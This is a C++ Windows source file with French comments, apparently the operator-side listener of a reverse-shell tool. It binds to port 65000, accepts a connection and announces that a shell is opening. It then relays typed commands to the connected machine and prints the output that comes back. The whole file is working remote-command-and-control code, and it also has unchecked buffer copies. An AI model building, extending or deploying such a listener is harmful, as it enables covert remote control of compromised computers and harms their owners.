#include <iostream>
#include <winsock2.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

const int PORT = 65000;

using namespace std;

string receive(SOCKET clientSocket, char buffer[]) {
    int bytesRead;
    string end="END";
    string output="";
    while (true) {
        bytesRead = recv(clientSocket, buffer, 2048, 0);
        if (bytesRead>0) {
            buffer[bytesRead] = '\0';
            if (buffer == end) break;
            output += buffer;
            output+= '\n';
        }
    }
    return output;
}

int main () {

    // Initialiser Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Erreur lors de l'initialisation de Winsock." << std::endl;
        return 1;
    }

    // Créer le socket
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Erreur lors de la création du socket." << endl;
        WSACleanup();
        return 1;
    }

    DWORD timeout = 10000;
    setsockopt(serverSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);


    // Définir les informations d'adresse
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(PORT);

    // Lier le socket à l'adresse et au port spécifiés
    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Erreur lors de la liaison du socket." << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Mettre en écoute le socket (pour un serveur)
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Erreur lors de la mise en écoute du socket." << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Server waiting for incoming connections..." << std::endl;

    // Accepter une connexion entrante (bloquant)
    SOCKET clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Erreur lors de l'acceptation de la connexion." << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    cout << "New connection! Tap entry to open a shell...\n" << endl;
    system("pause");

    string msg;
    char cmd_array[1024];
    char buffer[2048];
    string out;
    char cwd[1024];

    while (true) {
        out = "";
        recv(clientSocket, cwd, 1024, 0);
        cout << endl << cwd << ">";
        std::getline(std::cin, msg);
        std::copy(msg.begin(), msg.end(), cmd_array);
        send(clientSocket, cmd_array, msg.length(), 0);
        if (msg=="exit") break;
        out = receive(clientSocket, buffer);
        cout << out;
    }
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}